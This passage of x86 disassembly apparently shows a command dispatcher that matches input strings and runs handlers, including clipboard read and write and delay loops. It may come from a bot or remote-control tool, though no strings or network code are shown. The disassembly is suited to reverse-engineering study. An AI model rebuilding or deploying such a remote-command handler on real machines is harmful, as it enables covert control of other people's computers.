  40b49c:	b9 00 52 41 00       	mov    $0x415200,%ecx
  40b4a1:	e8 76 6d ff ff       	call   0x40221c
  40b4a6:	e9 1c f7 ff ff       	jmp    0x40abc7
  40b4ab:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b4ae:	68 70 14 41 00       	push   $0x411470
  40b4b3:	50                   	push   %eax
  40b4b4:	ff d3                	call   *%ebx
  40b4b6:	59                   	pop    %ecx
  40b4b7:	84 c0                	test   %al,%al
  40b4b9:	59                   	pop    %ecx
  40b4ba:	74 10                	je     0x40b4cc
  40b4bc:	ff 15 48 52 41 00    	call   *0x415248
  40b4c2:	b9 00 52 41 00       	mov    $0x415200,%ecx
  40b4c7:	e9 76 f9 ff ff       	jmp    0x40ae42
  40b4cc:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b4cf:	68 64 14 41 00       	push   $0x411464
  40b4d4:	50                   	push   %eax
  40b4d5:	ff d3                	call   *%ebx
  40b4d7:	59                   	pop    %ecx
  40b4d8:	84 c0                	test   %al,%al
  40b4da:	59                   	pop    %ecx
  40b4db:	74 59                	je     0x40b536
  40b4dd:	80 25 b8 51 41 00 00 	andb   $0x0,0x4151b8
  40b4e4:	6a 03                	push   $0x3
  40b4e6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b4e9:	e8 9b 5d ff ff       	call   0x401289
  40b4ee:	8b c8                	mov    %eax,%ecx
  40b4f0:	ff 15 58 02 41 00    	call   *0x410258
  40b4f6:	50                   	push   %eax
  40b4f7:	ff d7                	call   *%edi
  40b4f9:	59                   	pop    %ecx
  40b4fa:	50                   	push   %eax
  40b4fb:	6a 02                	push   $0x2
  40b4fd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b500:	e8 84 5d ff ff       	call   0x401289
  40b505:	8b c8                	mov    %eax,%ecx
  40b507:	ff 15 58 02 41 00    	call   *0x410258
  40b50d:	50                   	push   %eax
  40b50e:	ff d7                	call   *%edi
  40b510:	59                   	pop    %ecx
  40b511:	50                   	push   %eax
  40b512:	6a 01                	push   $0x1
  40b514:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b517:	e8 6d 5d ff ff       	call   0x401289
  40b51c:	8b c8                	mov    %eax,%ecx
  40b51e:	ff 15 58 02 41 00    	call   *0x410258
  40b524:	50                   	push   %eax
  40b525:	ff d7                	call   *%edi
  40b527:	59                   	pop    %ecx
  40b528:	50                   	push   %eax
  40b529:	e8 9b 5e ff ff       	call   0x4013c9
  40b52e:	83 c4 0c             	add    $0xc,%esp
  40b531:	e9 ce 00 00 00       	jmp    0x40b604
  40b536:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b539:	68 54 14 41 00       	push   $0x411454
  40b53e:	50                   	push   %eax
  40b53f:	ff d3                	call   *%ebx
  40b541:	59                   	pop    %ecx
  40b542:	84 c0                	test   %al,%al
  40b544:	59                   	pop    %ecx
  40b545:	74 24                	je     0x40b56b
  40b547:	ff 35 58 51 41 00    	push   0x415158
  40b54d:	c6 05 b8 51 41 00 01 	movb   $0x1,0x4151b8
  40b554:	ff 15 84 04 41 00    	call   *0x410484
  40b55a:	ff 35 58 51 41 00    	push   0x415158
  40b560:	ff 15 88 04 41 00    	call   *0x410488
  40b566:	e9 99 00 00 00       	jmp    0x40b604
  40b56b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b56e:	68 4c 14 41 00       	push   $0x41144c
  40b573:	50                   	push   %eax
  40b574:	ff d3                	call   *%ebx
  40b576:	59                   	pop    %ecx
  40b577:	84 c0                	test   %al,%al
  40b579:	59                   	pop    %ecx
  40b57a:	0f 84 84 00 00 00    	je     0x40b604
  40b580:	6a 05                	push   $0x5
  40b582:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b585:	c6 05 70 5a 41 00 01 	movb   $0x1,0x415a70
  40b58c:	e8 f8 5c ff ff       	call   0x401289
  40b591:	83 ec 10             	sub    $0x10,%esp
  40b594:	8b cc                	mov    %esp,%ecx
  40b596:	50                   	push   %eax
  40b597:	ff 15 60 02 41 00    	call   *0x410260
  40b59d:	6a 04                	push   $0x4
  40b59f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b5a2:	e8 e2 5c ff ff       	call   0x401289
  40b5a7:	83 ec 10             	sub    $0x10,%esp
  40b5aa:	8b cc                	mov    %esp,%ecx
  40b5ac:	50                   	push   %eax
  40b5ad:	ff 15 60 02 41 00    	call   *0x410260
  40b5b3:	6a 03                	push   $0x3
  40b5b5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b5b8:	e8 cc 5c ff ff       	call   0x401289
  40b5bd:	83 ec 10             	sub    $0x10,%esp
  40b5c0:	8b cc                	mov    %esp,%ecx
  40b5c2:	50                   	push   %eax
  40b5c3:	ff 15 60 02 41 00    	call   *0x410260
  40b5c9:	6a 02                	push   $0x2
  40b5cb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b5ce:	e8 b6 5c ff ff       	call   0x401289
  40b5d3:	83 ec 10             	sub    $0x10,%esp
  40b5d6:	8b cc                	mov    %esp,%ecx
  40b5d8:	50                   	push   %eax
  40b5d9:	ff 15 60 02 41 00    	call   *0x410260
  40b5df:	6a 01                	push   $0x1
  40b5e1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b5e4:	e8 a0 5c ff ff       	call   0x401289
  40b5e9:	83 ec 10             	sub    $0x10,%esp
  40b5ec:	8b cc                	mov    %esp,%ecx
  40b5ee:	50                   	push   %eax
  40b5ef:	ff 15 60 02 41 00    	call   *0x410260
  40b5f5:	e8 b7 d0 ff ff       	call   0x4086b1
  40b5fa:	83 c4 50             	add    $0x50,%esp
  40b5fd:	80 25 70 5a 41 00 00 	andb   $0x0,0x415a70
  40b604:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b607:	68 40 14 41 00       	push   $0x411440
  40b60c:	50                   	push   %eax
  40b60d:	ff d3                	call   *%ebx
  40b60f:	59                   	pop    %ecx
  40b610:	84 c0                	test   %al,%al
  40b612:	59                   	pop    %ecx
  40b613:	74 1e                	je     0x40b633
  40b615:	6a 01                	push   $0x1
  40b617:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b61a:	e8 6a 5c ff ff       	call   0x401289
  40b61f:	8b c8                	mov    %eax,%ecx
  40b621:	ff 15 58 02 41 00    	call   *0x410258
  40b627:	50                   	push   %eax
  40b628:	ff 15 50 01 41 00    	call   *0x410150
  40b62e:	e9 42 06 00 00       	jmp    0x40bc75
  40b633:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b636:	68 38 14 41 00       	push   $0x411438
  40b63b:	50                   	push   %eax
  40b63c:	ff d3                	call   *%ebx
  40b63e:	59                   	pop    %ecx
  40b63f:	84 c0                	test   %al,%al
  40b641:	59                   	pop    %ecx
  40b642:	74 08                	je     0x40b64c
  40b644:	6a 00                	push   $0x0
  40b646:	ff 15 ac 03 41 00    	call   *0x4103ac
  40b64c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b64f:	68 2c 14 41 00       	push   $0x41142c
  40b654:	50                   	push   %eax
  40b655:	ff d3                	call   *%ebx
  40b657:	59                   	pop    %ecx
  40b658:	84 c0                	test   %al,%al
  40b65a:	59                   	pop    %ecx
  40b65b:	74 1d                	je     0x40b67a
  40b65d:	80 3d 70 5a 41 00 00 	cmpb   $0x0,0x415a70
  40b664:	74 0a                	je     0x40b670
  40b666:	6a 64                	push   $0x64
  40b668:	ff 15 8c 01 41 00    	call   *0x41018c
  40b66e:	eb ed                	jmp    0x40b65d
  40b670:	e8 13 b3 ff ff       	call   0x406988
  40b675:	e9 fb 05 00 00       	jmp    0x40bc75
  40b67a:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b67d:	68 1c 14 41 00       	push   $0x41141c
  40b682:	50                   	push   %eax
  40b683:	ff d3                	call   *%ebx
  40b685:	59                   	pop    %ecx
  40b686:	84 c0                	test   %al,%al
  40b688:	59                   	pop    %ecx
  40b689:	0f 84 b9 00 00 00    	je     0x40b748
  40b68f:	80 3d 70 5a 41 00 00 	cmpb   $0x0,0x415a70
  40b696:	74 0a                	je     0x40b6a2
  40b698:	6a 64                	push   $0x64
  40b69a:	ff 15 8c 01 41 00    	call   *0x41018c
  40b6a0:	eb ed                	jmp    0x40b68f
  40b6a2:	6a 02                	push   $0x2
  40b6a4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b6a7:	e8 dd 5b ff ff       	call   0x401289
  40b6ac:	50                   	push   %eax
  40b6ad:	8d 45 0b             	lea    0xb(%ebp),%eax
  40b6b0:	68 cc 08 41 00       	push   $0x4108cc
  40b6b5:	50                   	push   %eax
  40b6b6:	68 94 0f 41 00       	push   $0x410f94
  40b6bb:	ff 15 64 03 41 00    	call   *0x410364
  40b6c1:	59                   	pop    %ecx
  40b6c2:	50                   	push   %eax
  40b6c3:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b6c6:	ff 15 4c 02 41 00    	call   *0x41024c
  40b6cc:	50                   	push   %eax
  40b6cd:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b6d0:	50                   	push   %eax
  40b6d1:	e8 4a 45 00 00       	call   0x40fc20
  40b6d6:	83 c4 0c             	add    $0xc,%esp
  40b6d9:	50                   	push   %eax
  40b6da:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b6dd:	50                   	push   %eax
  40b6de:	e8 31 45 00 00       	call   0x40fc14
  40b6e3:	83 c4 0c             	add    $0xc,%esp
  40b6e6:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b6e9:	ff 15 54 02 41 00    	call   *0x410254
  40b6ef:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b6f2:	ff 15 54 02 41 00    	call   *0x410254
  40b6f8:	33 f6                	xor    %esi,%esi
  40b6fa:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b6fd:	56                   	push   %esi
  40b6fe:	56                   	push   %esi
  40b6ff:	ff 15 58 02 41 00    	call   *0x410258
  40b705:	50                   	push   %eax
  40b706:	6a 01                	push   $0x1
  40b708:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b70b:	e8 79 5b ff ff       	call   0x401289
  40b710:	8b c8                	mov    %eax,%ecx
  40b712:	ff 15 58 02 41 00    	call   *0x410258
  40b718:	50                   	push   %eax
  40b719:	56                   	push   %esi
  40b71a:	e8 37 48 00 00       	call   0x40ff56
  40b71f:	85 c0                	test   %eax,%eax
  40b721:	75 17                	jne    0x40b73a
  40b723:	83 ec 10             	sub    $0x10,%esp
  40b726:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b729:	8b cc                	mov    %esp,%ecx
  40b72b:	50                   	push   %eax
  40b72c:	ff 15 60 02 41 00    	call   *0x410260
  40b732:	e8 f2 b5 ff ff       	call   0x406d29
  40b737:	83 c4 10             	add    $0x10,%esp
  40b73a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b73d:	ff 15 54 02 41 00    	call   *0x410254
  40b743:	e9 2d 05 00 00       	jmp    0x40bc75
  40b748:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b74b:	68 0c 14 41 00       	push   $0x41140c
  40b750:	50                   	push   %eax
  40b751:	ff d3                	call   *%ebx
  40b753:	59                   	pop    %ecx
  40b754:	84 c0                	test   %al,%al
  40b756:	59                   	pop    %ecx
  40b757:	0f 84 fc 00 00 00    	je     0x40b859
  40b75d:	80 3d 70 5a 41 00 00 	cmpb   $0x0,0x415a70
  40b764:	74 0a                	je     0x40b770
  40b766:	6a 64                	push   $0x64
  40b768:	ff 15 8c 01 41 00    	call   *0x41018c
  40b76e:	eb ed                	jmp    0x40b75d
  40b770:	6a 01                	push   $0x1
  40b772:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b775:	e8 0f 5b ff ff       	call   0x401289
  40b77a:	50                   	push   %eax
  40b77b:	8d 45 0b             	lea    0xb(%ebp),%eax
  40b77e:	68 cc 08 41 00       	push   $0x4108cc
  40b783:	50                   	push   %eax
  40b784:	68 94 0f 41 00       	push   $0x410f94
  40b789:	ff 15 64 03 41 00    	call   *0x410364
  40b78f:	59                   	pop    %ecx
  40b790:	50                   	push   %eax
  40b791:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b794:	ff 15 4c 02 41 00    	call   *0x41024c
  40b79a:	50                   	push   %eax
  40b79b:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b79e:	50                   	push   %eax
  40b79f:	e8 7c 44 00 00       	call   0x40fc20
  40b7a4:	83 c4 0c             	add    $0xc,%esp
  40b7a7:	50                   	push   %eax
  40b7a8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b7ab:	50                   	push   %eax
  40b7ac:	e8 63 44 00 00       	call   0x40fc14
  40b7b1:	83 c4 0c             	add    $0xc,%esp
  40b7b4:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b7b7:	ff 15 54 02 41 00    	call   *0x410254
  40b7bd:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b7c0:	ff 15 54 02 41 00    	call   *0x410254
  40b7c6:	6a 01                	push   $0x1
  40b7c8:	6a 32                	push   $0x32
  40b7ca:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b7cd:	ff 15 58 02 41 00    	call   *0x410258
  40b7d3:	50                   	push   %eax
  40b7d4:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40b7da:	ff 15 2c 02 41 00    	call   *0x41022c
  40b7e0:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40b7e6:	ff 15 30 02 41 00    	call   *0x410230
  40b7ec:	84 c0                	test   %al,%al
  40b7ee:	74 55                	je     0x40b845
  40b7f0:	6a 02                	push   $0x2
  40b7f2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b7f5:	e8 8f 5a ff ff       	call   0x401289
  40b7fa:	8b c8                	mov    %eax,%ecx
  40b7fc:	ff 15 90 02 41 00    	call   *0x410290
  40b802:	50                   	push   %eax
  40b803:	6a 02                	push   $0x2
  40b805:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b808:	e8 7c 5a ff ff       	call   0x401289
  40b80d:	8b c8                	mov    %eax,%ecx
  40b80f:	ff 15 58 02 41 00    	call   *0x410258
  40b815:	50                   	push   %eax
  40b816:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40b81c:	ff 15 7c 02 41 00    	call   *0x41027c
  40b822:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40b828:	ff 15 fc 02 41 00    	call   *0x4102fc
  40b82e:	83 ec 10             	sub    $0x10,%esp
  40b831:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b834:	8b cc                	mov    %esp,%ecx
  40b836:	50                   	push   %eax
  40b837:	ff 15 60 02 41 00    	call   *0x410260
  40b83d:	e8 e7 b4 ff ff       	call   0x406d29
  40b842:	83 c4 10             	add    $0x10,%esp
  40b845:	8d 8d 78 fe ff ff    	lea    -0x188(%ebp),%ecx
  40b84b:	ff 15 f8 02 41 00    	call   *0x4102f8
  40b851:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b854:	e9 e4 fe ff ff       	jmp    0x40b73d
  40b859:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b85c:	68 04 14 41 00       	push   $0x411404
  40b861:	50                   	push   %eax
  40b862:	ff d3                	call   *%ebx
  40b864:	59                   	pop    %ecx
  40b865:	84 c0                	test   %al,%al
  40b867:	59                   	pop    %ecx
  40b868:	74 4f                	je     0x40b8b9
  40b86a:	6a 03                	push   $0x3
  40b86c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b86f:	e8 15 5a ff ff       	call   0x401289
  40b874:	8b c8                	mov    %eax,%ecx
  40b876:	ff 15 58 02 41 00    	call   *0x410258
  40b87c:	50                   	push   %eax
  40b87d:	ff d7                	call   *%edi
  40b87f:	59                   	pop    %ecx
  40b880:	05 00 00 01 00       	add    $0x10000,%eax
  40b885:	50                   	push   %eax
  40b886:	6a 02                	push   $0x2
  40b888:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b88b:	e8 f9 59 ff ff       	call   0x401289
  40b890:	8b c8                	mov    %eax,%ecx
  40b892:	ff 15 58 02 41 00    	call   *0x410258
  40b898:	50                   	push   %eax
  40b899:	6a 01                	push   $0x1
  40b89b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b89e:	e8 e6 59 ff ff       	call   0x401289
  40b8a3:	8b c8                	mov    %eax,%ecx
  40b8a5:	ff 15 58 02 41 00    	call   *0x410258
  40b8ab:	50                   	push   %eax
  40b8ac:	6a 00                	push   $0x0
  40b8ae:	ff 15 00 04 41 00    	call   *0x410400
  40b8b4:	e9 bc 03 00 00       	jmp    0x40bc75
  40b8b9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b8bc:	68 f8 13 41 00       	push   $0x4113f8
  40b8c1:	50                   	push   %eax
  40b8c2:	ff d3                	call   *%ebx
  40b8c4:	59                   	pop    %ecx
  40b8c5:	84 c0                	test   %al,%al
  40b8c7:	59                   	pop    %ecx
  40b8c8:	74 22                	je     0x40b8ec
  40b8ca:	6a 01                	push   $0x1
  40b8cc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b8cf:	e8 b5 59 ff ff       	call   0x401289
  40b8d4:	8b c8                	mov    %eax,%ecx
  40b8d6:	ff 15 58 02 41 00    	call   *0x410258
  40b8dc:	50                   	push   %eax
  40b8dd:	ff d7                	call   *%edi
  40b8df:	50                   	push   %eax
  40b8e0:	e8 88 2b 00 00       	call   0x40e46d
  40b8e5:	59                   	pop    %ecx
  40b8e6:	59                   	pop    %ecx
  40b8e7:	e9 89 03 00 00       	jmp    0x40bc75
  40b8ec:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b8ef:	68 f0 13 41 00       	push   $0x4113f0
  40b8f4:	50                   	push   %eax
  40b8f5:	ff d3                	call   *%ebx
  40b8f7:	59                   	pop    %ecx
  40b8f8:	84 c0                	test   %al,%al
  40b8fa:	59                   	pop    %ecx
  40b8fb:	74 52                	je     0x40b94f
  40b8fd:	6a 03                	push   $0x3
  40b8ff:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b902:	e8 82 59 ff ff       	call   0x401289
  40b907:	8b c8                	mov    %eax,%ecx
  40b909:	ff 15 58 02 41 00    	call   *0x410258
  40b90f:	50                   	push   %eax
  40b910:	ff d7                	call   *%edi
  40b912:	59                   	pop    %ecx
  40b913:	50                   	push   %eax
  40b914:	6a 02                	push   $0x2
  40b916:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b919:	e8 6b 59 ff ff       	call   0x401289
  40b91e:	8b c8                	mov    %eax,%ecx
  40b920:	ff 15 58 02 41 00    	call   *0x410258
  40b926:	50                   	push   %eax
  40b927:	ff d7                	call   *%edi
  40b929:	59                   	pop    %ecx
  40b92a:	50                   	push   %eax
  40b92b:	6a 01                	push   $0x1
  40b92d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b930:	e8 54 59 ff ff       	call   0x401289
  40b935:	8b c8                	mov    %eax,%ecx
  40b937:	ff 15 58 02 41 00    	call   *0x410258
  40b93d:	50                   	push   %eax
  40b93e:	ff d7                	call   *%edi
  40b940:	59                   	pop    %ecx
  40b941:	50                   	push   %eax
  40b942:	e8 cd 2a 00 00       	call   0x40e414
  40b947:	83 c4 0c             	add    $0xc,%esp
  40b94a:	e9 26 03 00 00       	jmp    0x40bc75
  40b94f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b952:	68 e8 13 41 00       	push   $0x4113e8
  40b957:	50                   	push   %eax
  40b958:	ff d3                	call   *%ebx
  40b95a:	59                   	pop    %ecx
  40b95b:	84 c0                	test   %al,%al
  40b95d:	59                   	pop    %ecx
  40b95e:	0f 84 c4 00 00 00    	je     0x40ba28
  40b964:	e8 d8 10 00 00       	call   0x40ca41
  40b969:	68 44 08 41 00       	push   $0x410844
  40b96e:	6a 01                	push   $0x1
  40b970:	5e                   	pop    %esi
  40b971:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b974:	56                   	push   %esi
  40b975:	e8 0f 59 ff ff       	call   0x401289
  40b97a:	50                   	push   %eax
  40b97b:	ff d3                	call   *%ebx
  40b97d:	59                   	pop    %ecx
  40b97e:	84 c0                	test   %al,%al
  40b980:	59                   	pop    %ecx
  40b981:	74 06                	je     0x40b989
  40b983:	33 ff                	xor    %edi,%edi
  40b985:	57                   	push   %edi
  40b986:	57                   	push   %edi
  40b987:	eb 39                	jmp    0x40b9c2
  40b989:	68 60 05 41 00       	push   $0x410560
  40b98e:	56                   	push   %esi
  40b98f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b992:	e8 f2 58 ff ff       	call   0x401289
  40b997:	50                   	push   %eax
  40b998:	ff d3                	call   *%ebx
  40b99a:	59                   	pop    %ecx
  40b99b:	84 c0                	test   %al,%al
  40b99d:	59                   	pop    %ecx
  40b99e:	74 06                	je     0x40b9a6
  40b9a0:	33 ff                	xor    %edi,%edi
  40b9a2:	57                   	push   %edi
  40b9a3:	56                   	push   %esi
  40b9a4:	eb 1c                	jmp    0x40b9c2
  40b9a6:	68 5c 05 41 00       	push   $0x41055c
  40b9ab:	56                   	push   %esi
  40b9ac:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b9af:	e8 d5 58 ff ff       	call   0x401289
  40b9b4:	50                   	push   %eax
  40b9b5:	ff d3                	call   *%ebx
  40b9b7:	59                   	pop    %ecx
  40b9b8:	84 c0                	test   %al,%al
  40b9ba:	59                   	pop    %ecx
  40b9bb:	74 0d                	je     0x40b9ca
  40b9bd:	33 ff                	xor    %edi,%edi
  40b9bf:	57                   	push   %edi
  40b9c0:	6a 02                	push   $0x2
  40b9c2:	ff 15 fc 03 41 00    	call   *0x4103fc
  40b9c8:	eb 02                	jmp    0x40b9cc
  40b9ca:	33 ff                	xor    %edi,%edi
  40b9cc:	68 d8 13 41 00       	push   $0x4113d8
  40b9d1:	68 c8 13 41 00       	push   $0x4113c8
  40b9d6:	ff 15 40 01 41 00    	call   *0x410140
  40b9dc:	50                   	push   %eax
  40b9dd:	ff 15 44 01 41 00    	call   *0x410144
  40b9e3:	68 48 08 41 00       	push   $0x410848
  40b9e8:	56                   	push   %esi
  40b9e9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b9ec:	89 45 08             	mov    %eax,0x8(%ebp)
  40b9ef:	e8 95 58 ff ff       	call   0x401289
  40b9f4:	50                   	push   %eax
  40b9f5:	ff d3                	call   *%ebx
  40b9f7:	59                   	pop    %ecx
  40b9f8:	84 c0                	test   %al,%al
  40b9fa:	59                   	pop    %ecx
  40b9fb:	74 0b                	je     0x40ba08
  40b9fd:	57                   	push   %edi
  40b9fe:	57                   	push   %edi
  40b9ff:	57                   	push   %edi
  40ba00:	ff 55 08             	call   *0x8(%ebp)
  40ba03:	e9 6d 02 00 00       	jmp    0x40bc75
  40ba08:	68 4c 08 41 00       	push   $0x41084c
  40ba0d:	56                   	push   %esi
  40ba0e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ba11:	e8 73 58 ff ff       	call   0x401289
  40ba16:	50                   	push   %eax
  40ba17:	ff d3                	call   *%ebx
  40ba19:	59                   	pop    %ecx
  40ba1a:	84 c0                	test   %al,%al
  40ba1c:	59                   	pop    %ecx
  40ba1d:	0f 84 52 02 00 00    	je     0x40bc75
  40ba23:	57                   	push   %edi
  40ba24:	57                   	push   %edi
  40ba25:	56                   	push   %esi
  40ba26:	eb d8                	jmp    0x40ba00
  40ba28:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ba2b:	68 b8 13 41 00       	push   $0x4113b8
  40ba30:	50                   	push   %eax
  40ba31:	ff d3                	call   *%ebx
  40ba33:	59                   	pop    %ecx
  40ba34:	84 c0                	test   %al,%al
  40ba36:	59                   	pop    %ecx
  40ba37:	0f 85 cb 00 00 00    	jne    0x40bb08
  40ba3d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ba40:	68 a8 13 41 00       	push   $0x4113a8
  40ba45:	50                   	push   %eax
  40ba46:	ff d3                	call   *%ebx
  40ba48:	59                   	pop    %ecx
  40ba49:	84 c0                	test   %al,%al
  40ba4b:	59                   	pop    %ecx
  40ba4c:	0f 84 85 00 00 00    	je     0x40bad7
  40ba52:	6a 00                	push   $0x0
  40ba54:	ff 15 f0 03 41 00    	call   *0x4103f0
  40ba5a:	85 c0                	test   %eax,%eax
  40ba5c:	0f 84 13 02 00 00    	je     0x40bc75
  40ba62:	ff 15 f8 03 41 00    	call   *0x4103f8
  40ba68:	6a 01                	push   $0x1
  40ba6a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ba6d:	e8 17 58 ff ff       	call   0x401289
  40ba72:	8b c8                	mov    %eax,%ecx
  40ba74:	ff 15 a0 02 41 00    	call   *0x4102a0
  40ba7a:	40                   	inc    %eax
  40ba7b:	50                   	push   %eax
  40ba7c:	68 00 20 00 00       	push   $0x2000
  40ba81:	ff 15 bc 00 41 00    	call   *0x4100bc
  40ba87:	8b d8                	mov    %eax,%ebx
  40ba89:	53                   	push   %ebx
  40ba8a:	ff 15 b8 00 41 00    	call   *0x4100b8
  40ba90:	6a 01                	push   $0x1
  40ba92:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ba95:	89 45 08             	mov    %eax,0x8(%ebp)
  40ba98:	e8 ec 57 ff ff       	call   0x401289
  40ba9d:	8b c8                	mov    %eax,%ecx
  40ba9f:	ff 15 58 02 41 00    	call   *0x410258
  40baa5:	8b f8                	mov    %eax,%edi
  40baa7:	83 c9 ff             	or     $0xffffffff,%ecx
  40baaa:	33 c0                	xor    %eax,%eax
  40baac:	53                   	push   %ebx
  40baad:	f2 ae                	repnz scas %es:(%edi),%al
  40baaf:	f7 d1                	not    %ecx
  40bab1:	2b f9                	sub    %ecx,%edi
  40bab3:	8b c1                	mov    %ecx,%eax
  40bab5:	8b f7                	mov    %edi,%esi
  40bab7:	8b 7d 08             	mov    0x8(%ebp),%edi
  40baba:	c1 e9 02             	shr    $0x2,%ecx
  40babd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40babf:	8b c8                	mov    %eax,%ecx
  40bac1:	83 e1 03             	and    $0x3,%ecx
  40bac4:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40bac6:	ff 15 b4 00 41 00    	call   *0x4100b4
  40bacc:	53                   	push   %ebx
  40bacd:	6a 01                	push   $0x1
  40bacf:	ff 15 f4 03 41 00    	call   *0x4103f4
  40bad5:	eb 2b                	jmp    0x40bb02
  40bad7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bada:	68 98 13 41 00       	push   $0x411398
  40badf:	50                   	push   %eax
  40bae0:	ff d3                	call   *%ebx
  40bae2:	59                   	pop    %ecx
  40bae3:	84 c0                	test   %al,%al
  40bae5:	59                   	pop    %ecx
  40bae6:	0f 84 8d 00 00 00    	je     0x40bb79
  40baec:	6a 00                	push   $0x0
  40baee:	ff 15 f0 03 41 00    	call   *0x4103f0
  40baf4:	85 c0                	test   %eax,%eax
  40baf6:	0f 84 79 01 00 00    	je     0x40bc75
  40bafc:	ff 15 f8 03 41 00    	call   *0x4103f8
  40bb02:	ff 15 e8 03 41 00    	call   *0x4103e8
  40bb08:	6a 00                	push   $0x0
  40bb0a:	ff 15 f0 03 41 00    	call   *0x4103f0
  40bb10:	85 c0                	test   %eax,%eax
  40bb12:	0f 84 5d 01 00 00    	je     0x40bc75
  40bb18:	6a 01                	push   $0x1
  40bb1a:	ff 15 ec 03 41 00    	call   *0x4103ec
  40bb20:	8b f0                	mov    %eax,%esi
  40bb22:	56                   	push   %esi
  40bb23:	ff 15 b8 00 41 00    	call   *0x4100b8
  40bb29:	56                   	push   %esi
  40bb2a:	8b f8                	mov    %eax,%edi
  40bb2c:	ff 15 b4 00 41 00    	call   *0x4100b4
  40bb32:	ff 15 e8 03 41 00    	call   *0x4103e8
  40bb38:	85 ff                	test   %edi,%edi
  40bb3a:	75 05                	jne    0x40bb41
  40bb3c:	bf 68 06 41 00       	mov    $0x410668,%edi
  40bb41:	83 ec 10             	sub    $0x10,%esp
  40bb44:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40bb47:	8b f4                	mov    %esp,%esi
  40bb49:	57                   	push   %edi
  40bb4a:	68 68 52 41 00       	push   $0x415268
  40bb4f:	68 88 13 41 00       	push   $0x411388
  40bb54:	50                   	push   %eax
  40bb55:	e8 c0 40 00 00       	call   0x40fc1a
  40bb5a:	83 c4 0c             	add    $0xc,%esp
  40bb5d:	50                   	push   %eax
  40bb5e:	56                   	push   %esi
  40bb5f:	e8 bc 40 00 00       	call   0x40fc20
  40bb64:	83 c4 0c             	add    $0xc,%esp
  40bb67:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40bb6c:	e8 27 66 ff ff       	call   0x402198
  40bb71:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40bb74:	e9 c4 fb ff ff       	jmp    0x40b73d
  40bb79:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bb7c:	68 80 13 41 00       	push   $0x411380
  40bb81:	50                   	push   %eax
  40bb82:	ff d3                	call   *%ebx
  40bb84:	59                   	pop    %ecx
  40bb85:	84 c0                	test   %al,%al
  40bb87:	59                   	pop    %ecx
  40bb88:	74 1d                	je     0x40bba7
  40bb8a:	6a 01                	push   $0x1
  40bb8c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40bb8f:	e8 f5 56 ff ff       	call   0x401289
  40bb94:	8b c8                	mov    %eax,%ecx
  40bb96:	ff 15 34 02 41 00    	call   *0x410234
  40bb9c:	50                   	push   %eax
